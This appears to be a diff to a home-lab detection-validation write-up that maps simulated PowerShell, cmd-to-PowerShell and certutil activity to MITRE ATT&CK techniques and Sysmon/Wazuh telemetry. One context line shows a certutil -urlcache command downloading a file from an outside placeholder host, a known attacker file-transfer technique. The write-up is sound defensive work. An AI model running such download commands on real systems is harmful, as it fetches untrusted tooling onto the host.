@@ -1,8 +1,20 @@
 # Detection Validation
 
+## MITRE ATT&CK Coverage
+
+This project demonstrates detection and validation of behaviours aligned to the following MITRE ATT&CK techniques:
+
+- T1059.001 — Command and Scripting Interpreter: PowerShell  
+- T1059 — Command and Scripting Interpreter  
+- T1105 — Ingress Tool Transfer  
+
+These techniques represent common execution and command-and-control behaviours observed in real-world attacks.
+
+---
+
 ## Objective
 
-To validate that simulated attacker behaviours were successfully detected, captured, and contextualised using endpoint telemetry.
+The objective of this phase is to validate that simulated attacker behaviours were successfully detected, captured, and contextualised using endpoint telemetry.
 
 This confirms that the detection pipeline is functioning correctly and producing meaningful signals for analysis.
 
@@ -45,6 +57,13 @@ powershell.exe -Command "Get-Process"
 - Tactic: Execution  
 - Technique: Command and Scripting Interpreter: PowerShell (T1059.001)  
 
+### Detection Tags
+
+- Execution  
+- PowerShell  
+- Endpoint Telemetry  
+- Sysmon Event ID 1  
+
 ### Analysis
 
 PowerShell execution is common in both legitimate administration and malicious activity. In isolation, this behaviour is low fidelity, but it becomes more significant when combined with unusual command-line arguments or suspicious context.
@@ -79,6 +98,13 @@ cmd.exe /c powershell.exe
 - Tactic: Execution  
 - Technique: Command and Scripting Interpreter (T1059)  
 
+### Detection Tags
+
+- Execution  
+- Process Relationship  
+- Parent-Child Behaviour  
+- Behavioural Detection  
+
 ### Analysis
 
 Process chains provide valuable context. While this behaviour can be legitimate, it becomes more suspicious when repeated, automated, or observed in unusual environments.
@@ -112,6 +138,13 @@ certutil.exe -urlcache -split -f http://example.com file.txt
 - Tactic: Command and Control  
 - Technique: Ingress Tool Transfer (T1105)  
 
+### Detection Tags
+
+- Command and Control  
+- Living Off the Land  
+- LOLBins  
+- File Transfer Behaviour  
+
 ### Analysis
 
 certutil is a legitimate system utility, but its use with external URLs is commonly associated with attacker behaviour. This makes it a valuable detection opportunity when used outside expected administrative context.
@@ -125,6 +158,18 @@ The following detection flow was confirmed:
 Simulated behaviour → Sysmon Event ID 1 → Wazuh ingestion → Analyst visibility
 
 This demonstrates that endpoint telemetry is successfully captured and centralised.
+
+---
+
+## Detection Classification
+
+The validated behaviours fall into the following detection categories:
+
+- Low Fidelity: Single PowerShell execution  
+- Medium Fidelity: Process chaining behaviour  
+- High Value Indicator: certutil usage with external URL  
+
+This classification reflects how a SOC analyst would prioritise and triage alerts based on context and behaviour.
 
 ---
 
